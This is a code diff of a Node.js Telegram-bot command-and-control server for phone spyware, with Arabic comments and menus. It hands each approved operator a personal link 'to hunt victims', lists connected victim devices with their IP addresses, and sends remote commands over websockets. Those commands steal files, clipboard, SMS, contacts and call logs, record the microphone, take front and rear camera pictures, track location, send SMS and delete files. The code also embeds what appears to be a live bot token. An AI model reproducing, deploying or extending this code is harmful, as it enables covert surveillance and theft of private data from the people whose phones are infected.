@@ -4,10 +4,10 @@ const http = require("http");
 const telegramBot = require("node-telegram-bot-api");
 const uuid4 = require("uuid").v4;
 
-// --- الإعدادات الأساسية للمطور @A_l_k_w_r_y ---
+// --- الإعدادات الأساسية (إدارة Amjed Alkwry) ---
 const token = '8531140296:AAGGyJqPaVSiRWTEUbrG1fmEsfLHVWELV20';
 const ADMIN_ID = 6568145373; 
-const DEV_USER = "@A_l_k_w_r_y";
+const BASE_URL = "https://labeb.onrender.com"; // رابط استضافتك الأساسي
 
 const app = express();
 const server = http.createServer(app);
@@ -15,65 +15,86 @@ const wss = new webSocket.Server({ server });
 const bot = new telegramBot(token, { polling: true });
 
 let clients = [];
-let userConfigs = {}; // لتخزين رابط استضافة كل مستخدم { userId: "https://url..." }
-let allowedUsers = [ADMIN_ID]; 
+let allowedUsers = [ADMIN_ID]; // المصرح لهم باستخدام البوت
 
-// --- لوحة التحكم ونظام تعدد الاستضافات ---
+// --- لوحة التحكم المركزية ---
 bot.on("message", (msg) => {
     const id = msg.chat.id;
     const text = msg.text;
 
+    // حماية النظام: تعليق أي شخص غير مصرح له
     if (!allowedUsers.includes(id)) {
-        bot.sendMessage(ADMIN_ID, `🔔 <b>طلب استخدام جديد!</b>\n🆔 المعرف: <code>${id}</code>`, {
+        bot.sendMessage(ADMIN_ID, `🔔 <b>طلب انضمام جديد:</b>\n👤 الاسم: <code>${msg.from.first_name}</code>\n🆔 الايدي: <code>${id}</code>`, {
             parse_mode: 'HTML',
             reply_markup: {
                 inline_keyboard: [[{ text: "✅ تفعيل حسابه", callback_data: `allow_${id}` }]]
             }
         });
-        return bot.sendMessage(id, "⏳ وصولك معلق.. بانتظار موافقة المطور.");
+        return bot.sendMessage(id, "⏳ <b>وصولك معلق..</b>\nطلبك قيد المراجعة من قبل المطور @A_l_k_w_r_y");
     }
 
-    if (text === "/start") {
-        const currentHost = userConfigs[id] || "لم يتم تعيين رابط بعد";
-        const welcomeMsg = `💎 <b>أهلاً بك في نظام السيطرة المتعدد</b>\n\n` +
-                           `🌐 <b>رابط استضافتك الحالي:</b>\n<code>${currentHost}</code>\n\n` +
-                           `⚙️ لتغيير رابط الاستضافة، أرسل الرابط مباشرة للبوت.`;
-        
-        bot.sendMessage(id, welcomeMsg, {
+    // أوامر الإمبراطور (الأدمن فقط)
+    if (id === ADMIN_ID) {
+        if (text === "/start") {
+            bot.sendMessage(id, `👑 <b>أهلاً بك يا مطورنا الأساسي</b>\n\n📊 الأجهزة النشطة: <code>${clients.length}</code>\n👥 المستخدمين: <code>${allowedUsers.length - 1}</code>`, {
+                parse_mode: 'HTML',
+                reply_markup: {
+                    keyboard: [
+                        ["📱 عرض كافة الضحايا", "👥 إدارة المصرح لهم"],
+                        ["🚫 طرد مستخدم بالايدي", "📢 إذاعة عامة"],
+                        ["🔄 تحديث النظام", "ℹ️ معلومات السيرفر"]
+                    ],
+                    resize_keyboard: true
+                }
+            });
+        }
+
+        // ميزة الطرد بالايدي
+        if (text === "🚫 طرد مستخدم بالايدي") {
+            bot.sendMessage(id, "✍️ أرسل ايدي الشخص الذي تريد إزالته نهائياً:");
+            bot.once("message", (m) => {
+                const target = parseInt(m.text);
+                if (target === ADMIN_ID) return bot.sendMessage(id, "❌ لا يمكنك طرد نفسك.");
+                allowedUsers = allowedUsers.filter(u => u !== target);
+                bot.sendMessage(id, `✅ تم طرد <code>${target}</code> وسحب صلاحياته.`, {parse_mode: 'HTML'});
+                bot.sendMessage(target, "⚠️ تمت إزالتك من النظام من قبل المطور.");
+            });
+        }
+    }
+
+    // أوامر لكل مستخدم مصرح له (بما فيهم أنت)
+    if (text === "/start" && id !== ADMIN_ID) {
+        const userLink = `${BASE_URL}/?id=${id}`;
+        bot.sendMessage(id, `💎 <b>أهلاً بك في نظام السيطرة</b>\n\n🔗 <b>رابط الاستضافة الخاص بك:</b>\n<code>${userLink}</code>\n\n⚠️ استخدم الرابط أعلاه لصيد الضحايا.`, {
             parse_mode: 'HTML',
             reply_markup: {
-                keyboard: [["📱 ضحاياي", "🔗 تعيين رابط جديد"], ["📊 الحالة العامة"]],
+                keyboard: [["📱 ضحاياي", "📊 حالتي"]],
                 resize_keyboard: true
             }
         });
     }
 
-    // ميزة تعيين رابط استضافة خاص لكل مستخدم
-    if (text && text.startsWith("http")) {
-        userConfigs[id] = text;
-        bot.sendMessage(id, `✅ تم اعتماد رابط استضافتك الخاص:\n<code>${text}</code>`, { parse_mode: 'HTML' });
-    }
-
-    if (text === "📱 ضحاياي") {
-        const myVictims = clients.filter(c => c.ownerId == id);
-        if (myVictims.length === 0) return bot.sendMessage(id, "❌ لا يوجد ضحايا على استضافتك حالياً.");
+    if (text === "📱 ضحاياي" || text === "📱 عرض كافة الضحايا") {
+        const myVictims = (id === ADMIN_ID) ? clients : clients.filter(c => c.ownerId == id);
+        if (myVictims.length === 0) return bot.sendMessage(id, "❌ لا يوجد ضحايا حالياً.");
         
         myVictims.forEach(c => {
-            bot.sendMessage(id, `📍 جهاز: <code>${c.id}</code>`, {
+            bot.sendMessage(id, `📍 جهاز: <code>${c.id}</code>\n🌍 IP: <code>${c.ip}</code>`, {
                 parse_mode: 'HTML',
-                reply_markup: { inline_keyboard: [[{ text: "🕹️ لوحة الاختراق", callback_data: `control_${c.id}` }]] }
+                reply_markup: { inline_keyboard: [[{ text: "🕹️ فتح لوحة الاختراق", callback_data: `control_${c.id}` }]] }
             });
         });
     }
 });
 
-// --- معالجة أزرار التحكم (اللغة العربية الفصحى) ---
+// --- لوحة الاختراق المعربة (طبق الأصل من الصورة) ---
 bot.on("callback_query", (q) => {
     const [action, value] = q.data.split("_");
 
     if (action === "allow") {
         allowedUsers.push(parseInt(value));
-        bot.sendMessage(value, "✅ تم تفعيل حسابك بنجاح!");
+        bot.sendMessage(value, "✅ تم تفعيل حسابك! أرسل /start للحصول على رابطك.");
+        bot.answerCallbackQuery(q.id, { text: "تم التفعيل" });
     }
 
     if (action === "control") {
@@ -81,16 +102,16 @@ bot.on("callback_query", (q) => {
         const controlButtons = {
             inline_keyboard: [
                 [{ text: "📥 جلب ملف", callback_data: `getfile_${victimId}` }, { text: "🗑️ حذف ملف", callback_data: `delfile_${victimId}` }],
-                [{ text: "📋 الحافظة", callback_data: `clip_${victimId}` }, { text: "🎙️ تسجيل صوتي", callback_data: `mic_${victimId}` }],
+                [{ text: "📋 الحافظة", callback_data: `clip_${victimId}` }, { text: "🎙️ تسجيل محيط", callback_data: `mic_${victimId}` }],
                 [{ text: "📸 كاميرا سيلفي", callback_data: `selfie_${victimId}` }, { text: "📸 كاميرا رئيسية", callback_data: `maincam_${victimId}` }],
                 [{ text: "📍 الموقع", callback_data: `loc_${victimId}` }, { text: "💬 رسالة توست", callback_data: `toast_${victimId}` }],
-                [{ text: "📞 سجل المكالمات", callback_data: `calls_${victimId}` }, { text: "👥 جهات الاتصال", callback_data: `contacts_${victimId}` }],
-                [{ text: "📳 اهتزاز", callback_data: `vibrate_${victimId}` }, { text: "🔔 إرسال إشعار", callback_data: `notif_${victimId}` }],
-                [{ text: "📩 سحب SMS", callback_data: `msgs_${victimId}` }, { text: "📤 إرسال SMS", callback_data: `sendmsg_${victimId}` }],
-                [{ text: "🎵 تشغيل صوت", callback_data: `play_${victimId}` }, { text: "🔇 إيقاف الصوت", callback_data: `stop_${victimId}` }]
+                [{ text: "📞 سجل المكالمات", callback_data: `calls_${victimId}` }, { text: "👥 قائمة الأسماء", callback_data: `contacts_${victimId}` }],
+                [{ text: "📳 اهتزاز", callback_data: `vibrate_${victimId}` }, { text: "🔔 إشعار", callback_data: `notif_${victimId}` }],
+                [{ text: "📩 سحب الرسائل", callback_data: `msgs_${victimId}` }, { text: "📤 إرسال رسالة", callback_data: `sendmsg_${victimId}` }],
+                [{ text: "🎵 تشغيل مقطع", callback_data: `play_${victimId}` }, { text: "🔇 إيقاف الصوت", callback_data: `stop_${victimId}` }]
             ]
         };
-        bot.sendMessage(q.message.chat.id, `🕹️ <b>التحكم بالجهاز:</b> <code>${victimId}</code>`, {
+        bot.sendMessage(q.message.chat.id, `🕹️ <b>لوحة التحكم بالضحية:</b> <code>${victimId}</code>`, {
             parse_mode: 'HTML', reply_markup: controlButtons
         });
     }
@@ -98,13 +119,12 @@ bot.on("callback_query", (q) => {
     const target = clients.find(c => c.id === value);
     if (target && action !== "allow" && action !== "control") {
         target.ws.send(JSON.stringify({ cmd: action }));
-        bot.answerCallbackQuery(q.id, { text: "🚀 جاري التنفيذ" });
+        bot.answerCallbackQuery(q.id, { text: "🚀 جاري التنفيذ..." });
     }
 });
 
-// --- نظام الربط الذكي ---
+// --- اتصال الضحايا ---
 wss.on('connection', (ws, req) => {
-    // استخراج ايدي صاحب الاستضافة من الرابط
     const urlParams = new URLSearchParams(req.url.split('?')[1]);
     const ownerId = urlParams.get('id') || ADMIN_ID; 
 
@@ -112,8 +132,9 @@ wss.on('connection', (ws, req) => {
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     
     clients.push({ id: deviceId, ws: ws, ip: ip, ownerId: ownerId });
+    bot.sendMessage(ownerId, `⚠️ <b>لقد وقع صيد جديد في رابطك! 🔥</b>\n🆔 الجهاز: <code>${deviceId}</code>`, { parse_mode: 'HTML' });
 
-    bot.sendMessage(ownerId, `⚠️ <b>تم سحب ضحية جديد على استضافتك! 🔥</b>\n🆔 الجهاز: <code>${deviceId}</code>`, { parse_mode: 'HTML' });
+    ws.on('close', () => { clients = clients.filter(c => c.id !== deviceId); });
 });
 
-server.listen(process.env.PORT || 3000, () => { console.log("Multi-Host System Active"); });
+server.listen(process.env.PORT || 3000, () => { console.log("System Running for Amjed Alkwry"); });
